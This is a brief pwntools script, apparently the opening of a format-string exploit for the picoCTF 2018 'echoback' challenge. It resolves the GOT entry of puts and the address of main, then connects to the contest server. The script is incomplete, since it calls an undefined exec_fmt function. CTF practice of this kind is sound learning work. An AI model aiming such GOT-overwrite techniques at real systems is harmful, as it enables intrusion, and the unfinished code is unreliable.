#!/usr/bin/env python

from pwn import *
import sys
argc = len(sys.argv)

#get addresses
e = ELF('./echoback')
exit_got = e.got['puts']
main = e.symbols['main']

if argc > 1:
	p = remote('2018shell.picoctf.com', 56800)
else:
	p = process('./echoback')

autofmt = FmtStr(exec_fmt)